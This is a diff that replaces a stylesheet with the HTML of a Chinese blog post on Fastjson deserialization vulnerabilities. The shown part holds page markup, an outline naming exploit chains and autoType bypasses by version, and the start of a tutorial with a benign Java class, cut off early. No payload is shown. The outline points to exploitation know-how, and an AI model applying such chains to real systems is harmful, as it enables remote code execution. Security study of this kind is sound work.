@@ -1,62 +1,856 @@
-.l_body {
-  display: flex;
-  margin: auto;
-  padding: 0 var(--gap-l);
-  justify-content: center;
-  font-size: var(--fsp);
-}
-.l_body .l_left {
-  z-index: 8;
-  width: var(--width-left);
-  flex-shrink: 0;
-  position: sticky;
-  position: -webkit-sticky;
-  top: 8px;
-}
-.l_body .l_main {
-  flex-shrink: 1;
-  flex-grow: 1;
-  width: 320px;
-  max-width: var(--width-main);
-}
-.main-mask {
-  position: fixed;
-  pointer-events: none;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.2);
-  z-index: 9;
-  opacity: 0;
-  trans1: opacity;
-}
-@media screen and (max-width: $device-mobile-max) {
-  .mobile-only {
-    display: block !important;
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
+  
+  <meta name="generator" content="Hexo 7.1.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>漏洞篇 - Fastjson 反序列化 - 妙尽璇机</title>
+
+  
+    <meta name="description" content="Fastjson 介绍Fastjson 是阿里巴巴开发的一个高性能 JSON 解析库，广泛应用于 Java 项目中。它的主要功能是对 JSON 数据进行序列化和反序列化，即将 Java 对象转换为 JSON 字符串，或者将 JSON 字符串解析为 Java 对象。Fastjson 的优势在于其速度和灵活性，特别是在处理大规模数据时性能表现良好。 快速入门导入如下依赖： 1234567&lt;dep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞篇 - Fastjson 反序列化">
+<meta property="og:url" content="https://changeyourway.github.io/2024/09/18/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="妙尽璇机">
+<meta property="og:description" content="Fastjson 介绍Fastjson 是阿里巴巴开发的一个高性能 JSON 解析库，广泛应用于 Java 项目中。它的主要功能是对 JSON 数据进行序列化和反序列化，即将 Java 对象转换为 JSON 字符串，或者将 JSON 字符串解析为 Java 对象。Fastjson 的优势在于其速度和灵活性，特别是在处理大规模数据时性能表现良好。 快速入门导入如下依赖： 1234567&lt;dep">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240908181155911.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240908182025834.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240908182419256.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240908183842566.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240908184736798.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909201051828.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909202110606.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909202301936.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909202358542.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909202729863.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909202826828.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909203543875.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909204441243.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909205354076.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909205522033.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909210324655.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909215418147.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912125238245.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909210450000.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909222558930.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909222829590.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909222955341.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909224200706.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909224746559.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909230114277.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909230613785.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910113902176.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910161435223.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910161832985.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910170924261.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910171423585.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909230901546.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909231153735.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909231640434.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909231809051.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909231942642.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240909232056519.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910102017246.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910102529191.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240910102649046.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912145741928.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912150115001.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912164123277.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912164248222.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912164342219.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912170012708.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240912170354428.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913103434968.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913104958868.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913105414488.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913105723942.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913110524125.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913113517522.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913132424499.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913133657546.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913142449126.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913142954488.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913143127325.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913144734333.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913162820916.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913163732527.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913170010985.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913171908677.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913172240384.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240913172929672.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914085706195.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914091152570.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914091314887.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914105410783.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914110613836.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914110912950.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914111737715.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914112022431.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914144929076.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914145325608.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914153242461.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240914155926713.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917152927051.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917153627744.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917154257933.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917155422586.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917161426258.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917162353677.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917163558857.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917164133794.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917165738561.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917165938185.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917170600675.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240917170803935.png">
+<meta property="article:published_time" content="2024-09-18T02:22:44.238Z">
+<meta property="article:modified_time" content="2025-03-08T14:18:07.319Z">
+<meta property="article:author" content="妙尽璇机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20240908181155911.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
+
+  
+    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
+  
+
+  
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
+</head>
+<body>
+
+<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/ChangeYourWay/changeyourway.github.io/refs/heads/main/assets/20210722092640_f61bd.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">真理所致，吾心所向</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-%E4%BB%8B%E7%BB%8D"><span class="toc-text">Fastjson 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8"><span class="toc-text">快速入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getter-setter-%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-text">getter&#x2F;setter 方法的调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-text">调用链总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93"><span class="toc-text">特性总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Fastjson 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-24"><span class="toc-text">fastjson 1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">TemplatesImpl 利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">JdbcRowSetImpl 利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-25"><span class="toc-text">fastjson 1.2.25</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#checkAutoType-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-text">checkAutoType 安全机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-42"><span class="toc-text">fastjson 1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-43"><span class="toc-text">fastjson 1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-44"><span class="toc-text">fastjson 1.2.44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-45"><span class="toc-text">fastjson 1.2.45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-47"><span class="toc-text">fastjson 1.2.47</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%9B-TypeUtils-mappings"><span class="toc-text">将类加载进 TypeUtils.mappings</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONScanner-%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="toc-text">JSONScanner 扫描器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ParserConfig-deserializers-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-text">ParserConfig.deserializers 的初始化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%A9%E4%BD%99%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">剩余利用链分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-68"><span class="toc-text">fastjson 1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThrowableDeserializer-deserialze"><span class="toc-text">ThrowableDeserializer#deserialze</span></a></li></ol></li></ol></li></ol></div></div></widget>
+
+
+
+
+
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2025/07/12/Java%20%E5%AE%89%E5%85%A8/RASP%20%E7%A0%94%E7%A9%B6%EF%BC%8COpenRasp%20%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BB%95%E8%BF%87/"><span class="title">RASP 研究，OpenRasp 原理与绕过</span></a><a class="item title" href="/2025/06/02/CTF/2025%20D%5E3CTF%20Web%20WP/"><span class="title">2025 D^3CTF Web WP</span></a><a class="item title" href="/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><span class="title">漏洞篇 - JNDI 注入详解</span></a><a class="item title" href="/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Hessian 反序列化详解</span></a><a class="item title" href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - SnakeYaml 反序列化</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    
+<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Java-%E5%AE%89%E5%85%A8/">Java 安全</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-09-18T02:22:44.238Z">2024-09-18</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-03-08T14:18:07.319Z">2025-03-08</time></span></div></div>
+</div>
+
+    
+    <div class="bottom">
+      <div class="text-area">
+        <h1 class="text title"><span>漏洞篇 - Fastjson 反序列化</span></h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="Fastjson-介绍"><a href="#Fastjson-介绍" class="headerlink" title="Fastjson 介绍"></a>Fastjson 介绍</h2><p>Fastjson 是阿里巴巴开发的一个高性能 JSON 解析库，广泛应用于 Java 项目中。它的主要功能是对 JSON 数据进行序列化和反序列化，即将 Java 对象转换为 JSON 字符串，或者将 JSON 字符串解析为 Java 对象。Fastjson 的优势在于其速度和灵活性，特别是在处理大规模数据时性能表现良好。</p>
+<h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><p>导入如下依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">     &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在 pojo 包下创建一个简单类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package pojo;</span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int id;</span><br><span class="line"></span><br><span class="line">    public User()&#123;</span><br><span class="line">        System.out.println(&quot;无参构造&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User(String name, int id) &#123;</span><br><span class="line">        System.out.println(&quot;有参构造&quot;);</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, id=&quot; + id +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        System.out.print(&quot;getName&quot;);</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(&quot;setName&quot;);</span><br><span class="line">        this.name = name;</span><br><span 